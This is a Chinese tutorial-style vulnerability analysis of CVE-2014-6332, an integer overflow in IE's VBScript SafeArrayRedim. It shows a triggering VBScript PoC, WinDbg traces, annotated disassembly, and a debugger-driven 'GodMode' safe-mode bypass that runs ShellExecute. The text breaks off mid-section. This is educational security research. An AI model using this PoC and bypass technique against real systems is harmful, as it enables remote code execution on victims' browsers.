<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>WinDbg 漏洞分析调试（三）之 CVE-2014-6332</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">WinDbg 漏洞分析调试（三）之 CVE-2014-6332</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2017-03-05" class="timeago">6 月，2 周 之前</time>
          <time datetime="2017-03-05" class="fulldate">三月 05, 2017</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/bin-security/">二进制安全</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p><input type="hidden" class="Authorrss" value="xd0ol1" name="#"></p>
<p>Author: <strong>xd0ol1 (知道创宇404实验室)</strong></p>
<p>前文回顾：</p>
<ul>
<li><a href="http://paper.seebug.org/179/">WinDbg 漏洞分析调试（一）</a></li>
<li><a href="http://paper.seebug.org/182/">WinDbg 漏洞分析调试（二）</a></li>
</ul>
<h3>0x00 引子</h3>
<p>本文将通过一个经典的IE漏洞来继续学习WinDbg相关的分析调试，错误之处还望各位大牛加以斧正:P</p>
<h3>0x01 概述</h3>
<p>我们要用到的是CVE-2014-6332这个漏洞，前辈们已经有过精彩的分析了，对应文章在参考部分有给出。此漏洞最值得借鉴的是其中所涉及的利用方式，上两篇分析的CVE-2012-1876需要绕过ASLR、DEP等保护手段来执行ROP＋shellcode，而CVE-2014-6332则是借助RW primitives＋GodMode的方式来实现漏洞的利用。不好说这两种思路孰优孰劣，应该是各有千秋的，绕过保护措施可能会复杂些，因而现今的exploit更多会先获取RW primitives，之后corrupt有关数据结构来实现代码的执行。</p>
<p>该漏洞在当时还是比较严重的，几乎所有Windows版本中的IE都受到了影响，它是由于VBScript引擎在重新分配数组储存空间时的错误引起的，具体来说是oleaut32模块SafeArrayRedim函数中的整数溢出错误。当然，微软目前已经放弃了VBScript，但我们学习的目的在于举一隅以三隅反，因此理解其原理还是很有必要的。</p>
<p>此处的分析环境为Win7 x86 - IE 8.0.7601.17514。</p>
<h3>0x02 RW primitives</h3>
<p>我们先来看下如何通过此漏洞来获取RW primitives，即corrupt后的SAFEARRAY结构，这里注意下，RW(Read/Write) primitives指的是exploit中那些用于实现内存读写的对象或函数。分析所用的PoC代码如下：</p>
<p>``` code html
<html>
<body>
  CVE-2014-6332 PoC.
<SCRIPT LANGUAGE="VBScript">
  On Error Resume Next
  dim a
  a=Array(1, 2, 4, 8)
  redim Preserve a(&amp;h08421420)
  redim Preserve a(3)
</script>
</body>
</html></p>
<div class="codehilite"><pre><span></span>我们知道在VBScript中，数组是以SAFEARRAY结构来保存的，其定义如下：
</pre></div>


<p>0:013&gt; dt ole32!tagSAFEARRAY
   +0x000 cDims            : Uint2B
   +0x002 fFeatures        : Uint2B
   +0x004 cbElements       : Uint4B
   +0x008 cLocks           : Uint4B
   +0x00c pvData           : Ptr32 Void
   +0x010 rgsabound        : [1] tagSAFEARRAYBOUND
0:013&gt; dt ole32!tagSAFEARRAYBOUND
   +0x000 cElements        : Uint4B
   +0x004 lLbound          : Int4B</p>
<div class="codehilite"><pre><span></span>其中cDims表示数组的维数，每个维度都对应一个SAFEARRAYBOUND结构，包含有此维度的大小和起始索引，同时，cbElements表示每个元素的大小，这些元素保存在pvData地址处。而对于fFeatures表示的含义，可参考此[说明](https://msdn.microsoft.com/en-us/library/windows/desktop/ms221482(v=vs.85).aspx)。

此外，可以通过IDA得到如下的SafeArrayRedim函数定义：

```c
HRESULT __stdcall SafeArrayRedim(SAFEARRAY *psa, SAFEARRAYBOUND *psaboundNew);
</pre></div>


<p>我们在IE中打开上述PoC文件，并用WinDbg附加相应进程，然后执行如下操作：</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">013</span><span class="o">&gt;</span> <span class="n">bp</span> <span class="n">OLEAUT32</span><span class="o">!</span><span class="n">SafeArrayRedim</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">013</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">3</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">023</span><span class="n">dcfa8</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">002</span><span class="n">c2a10</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0006</span><span class="n">fa58</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0000400</span><span class="n">c</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0006</span><span class="n">fa58</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000000</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">75</span><span class="n">aeec2c</span> <span class="n">esp</span><span class="o">=</span><span class="mi">023</span><span class="n">dcf94</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">023</span><span class="n">dcfb0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">OLEAUT32</span><span class="o">!</span><span class="n">SafeArrayRedim</span><span class="o">:</span>
<span class="mi">75</span><span class="n">aeec2c</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">kb</span> <span class="mi">3</span>
<span class="n">ChildEBP</span> <span class="n">RetAddr</span>  <span class="n">Args</span> <span class="n">to</span> <span class="n">Child</span>              
<span class="mi">023</span><span class="n">dcf90</span> <span class="mi">728</span><span class="n">c58da</span> <span class="mi">002</span><span class="n">c2a10</span> <span class="mi">023</span><span class="n">dcfa8</span> <span class="mi">0006</span><span class="n">f438</span> <span class="n">OLEAUT32</span><span class="o">!</span><span class="n">SafeArrayRedim</span>
<span class="mi">023</span><span class="n">dcfb0</span> <span class="mi">728</span><span class="n">c5887</span> <span class="mi">00000001</span> <span class="mi">00000001</span> <span class="mi">0006</span><span class="n">fa58</span> <span class="n">vbscript</span><span class="o">!</span><span class="n">RedimPreserveArray</span><span class="o">+</span><span class="mh">0x81</span>
<span class="mi">023</span><span class="n">dd0ac</span> <span class="mi">728</span><span class="n">b4ff6</span> <span class="mi">023</span><span class="n">dd214</span> <span class="mi">8</span><span class="n">f64c1b9</span> <span class="mi">00000000</span> <span class="n">vbscript</span><span class="o">!</span><span class="n">CScriptRuntime</span><span class="o">::</span><span class="n">RunNoEH</span><span class="o">+</span><span class="mh">0x1466</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">002</span><span class="n">c2a10</span> <span class="n">L6</span>
<span class="mi">002</span><span class="n">c2a10</span>  <span class="mi">08800001</span> <span class="mi">00000010</span> <span class="mi">00000000</span> <span class="mi">00234298</span>
<span class="mi">002</span><span class="n">c2a20</span>  <span class="mi">00000004</span> <span class="mi">00000000</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">023</span><span class="n">dcfa8</span> <span class="n">L2</span>
<span class="mi">023</span><span class="n">dcfa8</span>  <span class="mi">08421421</span> <span class="mi">00000000</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">00234298</span> <span class="n">L10</span>
<span class="mi">00234298</span>  <span class="mi">00000002</span> <span class="mi">00000000</span> <span class="mi">00000001</span> <span class="mi">00000000</span>
<span class="mi">002342</span><span class="n">a8</span>  <span class="mi">00000002</span> <span class="mi">00000000</span> <span class="mi">00000002</span> <span class="mi">00000000</span>
<span class="mi">002342</span><span class="n">b8</span>  <span class="mi">00000002</span> <span class="mi">00000000</span> <span class="mi">00000004</span> <span class="mi">00000000</span>
<span class="mi">002342</span><span class="n">c8</span>  <span class="mi">00000002</span> <span class="mi">00000000</span> <span class="mi">00000008</span> <span class="mi">00000000</span>
</pre></div>


<p>可以看到，最初定义的数组维度为1，共有0x04个Variant型元素，且每个元素占0x10字节。这里特别强调下Variant结构，它在后续会经常用到，其定义如下：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/03/0.png-w331s" />
<center><small>图0&nbsp;&nbsp;Variant结构的定义</small></center></p>
<p>保存浮点数时会同时使用Data High和Data Low字段，而如果只保存整型或指针则仅需Data High字段，Type字段的定义可参考<a href="https://msdn.microsoft.com/en-us/library/3kfz157h(v=vs.84).aspx">这里</a>，在本文中涉及到的类型如下：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/03/1.png-w331s" />
<center><small>图1&nbsp;&nbsp;Type字段的定义</small></center></p>
<p>接着脚本借助redim来重新分配数组空间，对应元素个数为0x08421420+1=0x08421421，即0x08421421*0x10=0x84214210字节空间，很显然这个分配操作会失败，毕竟32位进程的用户态空间最大也只到0x7fffffff，但由于存在如下语句，脚本将会继续执行：</p>
<p>``` code html
On Error Resume Next</p>
<div class="codehilite"><pre><span></span>当跳出SafeArrayRedim函数后，我们再看下此时SAFEARRAY结构中的内容：
</pre></div>


<p>0:005&gt; dd 002c2a10 L6
002c2a10  08800001 00000010 00000000 00234298
002c2a20  08421421 00000000</p>
<div class="codehilite"><pre><span></span>即数组的起始地址仍为0x00234298，但索引范围变成了0~0x08421420，这正是我们要用到的corrupt后的SAFEARRAY结构，通过它可以获取RW primitives功能。如下给出了漏洞的具体成因：
</pre></div>


<p>0:005&gt; uf OLEAUT32!SafeArrayRedim
OLEAUT32!SafeArrayRedim:
75aeec2c 8bff            mov     edi,edi
75aeec2e 55              push    ebp
75aeec2f 8bec            mov     ebp,esp
75aeec31 83ec18          sub     esp,18h
75aeec34 53              push    ebx
75aeec35 56              push    esi
75aeec36 8b7508          mov     esi,dword ptr [ebp+8]
75aeec39 57              push    edi
75aeec3a 33ff            xor     edi,edi
75aeec3c 3bf7            cmp     esi,edi
75aeec3e 0f843f030000    je      OLEAUT32!SafeArrayRedim+0x1d2 (75aeef83)</p>
<p>OLEAUT32!SafeArrayRedim+0x18:
75aeec44 397d0c          cmp     dword ptr [ebp+0Ch],edi
75aeec47 0f8436030000    je      OLEAUT32!SafeArrayRedim+0x1d2 (75aeef83)</p>
<p>OLEAUT32!SafeArrayRedim+0x21:
75aeec4d 0fb74e02        movzx   ecx,word ptr [esi+2]
75aeec51 8bc1            mov     eax,ecx
75aeec53 2500200000      and     eax,2000h
75aeec58 8945f4          mov     dword ptr [ebp-0Ch],eax
75aeec5b 66393e          cmp     word ptr [esi],di
75aeec5e 0f841f030000    je      OLEAUT32!SafeArrayRedim+0x1d2 (75aeef83)</p>
<p>OLEAUT32!SafeArrayRedim+0x38:
75aeec64 397e08          cmp     dword ptr [esi+8],edi
75aeec67 0f870c030000    ja      OLEAUT32!SafeArrayRedim+0x1cb (75aeef79)</p>
<p>OLEAUT32!SafeArrayRedim+0x41:
75aeec6d f6c110          test    cl,10h
75aeec70 0f8503030000    jne     OLEAUT32!SafeArrayRedim+0x1cb (75aeef79)</p>
<p>OLEAUT32!SafeArrayRedim+0x4a:
75aeec76 8d45f0          lea     eax,[ebp-10h]
75aeec79 50              push    eax
75aeec7a 897d08          mov     dword ptr [ebp+8],edi
75aeec7d 897df0          mov     dword ptr [ebp-10h],edi
75aeec80 e8f15dfeff      call    OLEAUT32!GetMalloc (75ad4a76)
75aeec85 8bd8            mov     ebx,eax
75aeec87 3bdf            cmp     ebx,edi
75aeec89 0f85d5020000    jne     OLEAUT32!SafeArrayRedim+0x5f (75aeef64)</p>
<p>OLEAUT32!SafeArrayRedim+0x65:
75aeec8f 56              push    esi  ;SAFEARRAY结构的指针
75aeec90 e868f0ffff      call    OLEAUT32!SafeArraySize (75aedcfd)  ;获取已分配的数组空间大小
75aeec95 8945fc          mov     dword ptr [ebp-4],eax  ;保存已分配空间大小值0x00000040
75aeec98 3bc7            cmp     eax,edi
75aeec9a 7409            je      OLEAUT32!SafeArrayRedim+0x7b (75aeeca5)</p>
<p>OLEAUT32!SafeArrayRedim+0x72:
75aeec9c 397e0c          cmp     dword ptr [esi+0Ch],edi
75aeec9f 0f84de020000    je      OLEAUT32!SafeArrayRedim+0x1d2 (75aeef83)</p>
<p>OLEAUT32!SafeArrayRedim+0x7b:
75aeeca5 8b450c          mov     eax,dword ptr [ebp+0Ch]
75aeeca8 8b08            mov     ecx,dword ptr [eax]
75aeecaa 8b5e10          mov     ebx,dword ptr [esi+10h]  ;备份rgsabound中的cElements值0x00000004
75aeecad 8b7e14          mov     edi,dword ptr [esi+14h]  ;备份rgsabound中的lLbound
75aeecb0 894e10          mov     dword ptr [esi+10h],ecx  ;修改rgsabound中的cElements为0x08421421
75aeecb3 8b4004          mov     eax,dword ptr [eax+4]
75aeecb6 56              push    esi  ;SAFEARRAY结构的指针
75aeecb7 895de8          mov     dword ptr [ebp-18h],ebx
75aeecba 897dec          mov     dword ptr [ebp-14h],edi
75aeecbd 894614          mov     dword ptr [esi+14h],eax  ;修改rgsabound中的lLbound
75aeecc0 e838f0ffff      call    OLEAUT32!SafeArraySize (75aedcfd)  ;获取待分配的数组空间大小
75aeecc5 8945f8          mov     dword ptr [ebp-8],eax  ;保存待分配空间大小值0x84214210
75aeecc8 83f8ff          cmp     eax,0FFFFFFFFh
75aeeccb 0f8490910100    je      OLEAUT32!SafeArrayRedim+0xa3 (75b07e61)</p>
<p>OLEAUT32!SafeArrayRedim+0xb3:
75aeecd1 8bd8            mov     ebx,eax
75aeecd3 2b5dfc          sub     ebx,dword ptr [ebp-4]  ;待分配大小减去已分配大小，等于0x842141d0
75aeecd6 0f84a8000000    je      OLEAUT32!SafeArrayRedim+0x1c7 (75aeed84)</p>
<p>OLEAUT32!SafeArrayRedim+0xbe:
75aeecdc 8b7df0          mov     edi,dword ptr [ebp-10h]
75aeecdf 85db            test    ebx,ebx
75aeece1 7d45            jge     OLEAUT32!SafeArrayRedim+0x110 (75aeed28)  ;将0x842141d0当作负数，整数溢出</p>
<p>OLEAUT32!SafeArrayRedim+0xc5:
75aeece3 b9200f0000      mov     ecx,0F20h
75aeece8 66854e02        test    word ptr [esi+2],cx
75aeecec 743a            je      OLEAUT32!SafeArrayRedim+0x110 (75aeed28)</p>
<p>OLEAUT32!SafeArrayRedim+0xd0:
75aeecee 837df400        cmp     dword ptr [ebp-0Ch],0
75aeecf2 0f8579910100    jne     OLEAUT32!SafeArrayRedim+0xd6 (75b07e71)</p>
<p>OLEAUT32!SafeArrayRedim+0xe0:
75aeecf8 8b07            mov     eax,dword ptr [edi]
75aeecfa 895d0c          mov     dword ptr [ebp+0Ch],ebx
75aeecfd f75d0c          neg     dword ptr [ebp+0Ch]
75aeed00 ff750c          push    dword ptr [ebp+0Ch]
75aeed03 57              push    edi
75aeed04 ff500c          call    dword ptr [eax+0Ch]  ;ole32!CRetailMalloc_Alloc，分配空间失败
75aeed07 894508          mov     dword ptr [ebp+8],eax
75aeed0a 85c0            test    eax,eax
75aeed0c 0f845d020000    je      OLEAUT32!SafeArrayRedim+0x19d (75aeef6f)</p>
<p>......</p>
<p>OLEAUT32!SafeArrayRedim+0x1b8:
75aeed75 837d0800        cmp     dword ptr [ebp+8],0
75aeed79 7409            je      OLEAUT32!SafeArrayRedim+0x1c7 (75aeed84)</p>
<p>OLEAUT32!SafeArrayRedim+0x1be:
75aeed7b ff7508          push    dword ptr [ebp+8]
75aeed7e 8b07            mov     eax,dword ptr [edi]
75aeed80 57              push    edi
75aeed81 ff5014          call    dword ptr [eax+14h]  ;ole32!CRetailMalloc_Free</p>
<p>OLEAUT32!SafeArrayRedim+0x1c7:
75aeed84 8bc3            mov     eax,ebx</p>
<p>OLEAUT32!SafeArrayRedim+0x1d7:
75aeed86 5f              pop     edi
75aeed87 5e              pop     esi
75aeed88 5b              pop     ebx
75aeed89 c9              leave
75aeed8a c20800          ret     8</p>
<p>......</p>
<p>OLEAUT32!SafeArrayRedim+0x19d:
75aeef6f bb0e000780      mov     ebx,8007000Eh
75aeef74 e9fcfdffff      jmp     OLEAUT32!SafeArrayRedim+0x1b8 (75aeed75)</p>
<p>......</p>
<div class="codehilite"><pre><span></span>我们知道SafeArrayRedim函数的第一个入参为SAFEARRAY结构的指针，其中包含已分配数组的SAFEARRAYBOUND信息，第二个入参为待分配数组的SAFEARRAYBOUND信息。在获取完已分配数组的大小后，程序根据待分配数组的SAFEARRAYBOUND信息来修改SAFEARRAY指针指向的原SAFEARRAYBOUND信息，即其中的cElements和lLbound，以此来获取待分配数组的大小。但由于之后jge指令将新增空间大小0x842141d0当成了负数，即整数溢出，导致程序进入错误的处理分支，新空间会分配失败，但函数在返回前并没有将原先备份的SAFEARRAYBOUND信息替换回去，从而分配的数组空间没变cElements值却改变了，因此corrupt后的SAFEARRAY结构可被用于内存的越界访问。

### 0x03 GodMode

接着我们来讨论如何在当前的IE环境中开启VBScript的GodMode，用到的代码如下：

```html
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;SCRIPT</span> <span class="na">LANGUAGE=</span><span class="s">&quot;VBScript&quot;</span><span class="nt">&gt;</span>
  On Error Resume Next
  set shell=createobject(&quot;Shell.Application&quot;)
  shell.ShellExecute &quot;notepad.exe&quot;
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></div>


<p>正常情况打开这个html文件是无法弹出记事本的，因为IE会禁止运行那些可能危害系统的脚本，它会通过vbscript!COleScript::InSafeMode函数来对SafeMode标志进行检查，此标志的默认值为0x0e。我们重新打开上述文件并在WinDbg中进行如下操作：</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">012</span><span class="o">&gt;</span> <span class="n">bu</span> <span class="n">vbscript</span><span class="o">!</span><span class="n">COleScript</span><span class="o">::</span><span class="n">InSafeMode</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">012</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">0</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">76140782</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0002</span><span class="n">bdd0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">76130000</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0002</span><span class="n">f558</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000000</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">f35ce4d</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0244</span><span class="n">d400</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0244</span><span class="n">d488</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">COleScript</span><span class="o">::</span><span class="n">InSafeMode</span><span class="o">:</span>
<span class="mi">6</span><span class="n">f35ce4d</span> <span class="n">f781740100000b000000</span> <span class="n">test</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ecx</span><span class="o">+</span><span class="mi">174</span><span class="n">h</span><span class="o">],</span><span class="mi">0</span><span class="n">Bh</span> <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">0002</span><span class="n">bf44</span><span class="o">=</span><span class="mi">0000000</span><span class="n">e</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">ln</span> <span class="n">poi</span><span class="o">(</span><span class="n">ecx</span><span class="o">)</span>
<span class="o">(</span><span class="mi">6</span><span class="n">f354868</span><span class="o">)</span>   <span class="n">vbscript</span><span class="o">!</span><span class="n">COleScript</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="s1">&#39;   |  (6f36fdbc)   vbscript!`string&#39;</span>
<span class="n">Exact</span> <span class="n">matches</span><span class="o">:</span>
    <span class="n">vbscript</span><span class="o">!</span><span class="n">COleScript</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="err">&#39;</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">no</span> <span class="n">type</span> <span class="n">information</span><span class="o">&gt;</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">ecx</span><span class="o">+</span><span class="mi">174</span><span class="n">h</span> <span class="n">L1</span>
<span class="mi">0002</span><span class="n">bf44</span>  <span class="mi">0000000</span><span class="n">e</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">uf</span> <span class="n">vbscript</span><span class="o">!</span><span class="n">COleScript</span><span class="o">::</span><span class="n">InSafeMode</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">COleScript</span><span class="o">::</span><span class="n">InSafeMode</span><span class="o">:</span>
<span class="mi">6</span><span class="n">f35ce4d</span> <span class="n">f781740100000b000000</span> <span class="n">test</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ecx</span><span class="o">+</span><span class="mi">174</span><span class="n">h</span><span class="o">],</span><span class="mi">0</span><span class="n">Bh</span>
<span class="mi">6</span><span class="n">f35ce57</span> <span class="mi">6</span><span class="n">a00</span>            <span class="n">push</span>    <span class="mi">0</span>
<span class="mi">6</span><span class="n">f35ce59</span> <span class="mi">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<span class="mi">6</span><span class="n">f35ce5a</span> <span class="mi">0</span><span class="n">f95c0</span>          <span class="n">setne</span>   <span class="n">al</span>
<span class="mi">6</span><span class="n">f35ce5d</span> <span class="n">c3</span>              <span class="n">ret</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">eb</span> <span class="n">ecx</span><span class="o">+</span><span class="mi">174</span><span class="n">h</span> <span class="mi">4</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">ecx</span><span class="o">+</span><span class="mi">174</span><span class="n">h</span> <span class="n">L1</span>
<span class="mi">0002</span><span class="n">bf44</span>  <span class="mi">00000004</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">0</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000001</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0002</span><span class="n">bdd0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0244</span><span class="n">d3b0</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000000</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">f35ce4d</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0244</span><span class="n">d400</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0244</span><span class="n">d488</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">COleScript</span><span class="o">::</span><span class="n">InSafeMode</span><span class="o">:</span>
<span class="mi">6</span><span class="n">f35ce4d</span> <span class="n">f781740100000b000000</span> <span class="n">test</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ecx</span><span class="o">+</span><span class="mi">174</span><span class="n">h</span><span class="o">],</span><span class="mi">0</span><span class="n">Bh</span> <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">0002</span><span class="n">bf44</span><span class="o">=</span><span class="mi">00000004</span>
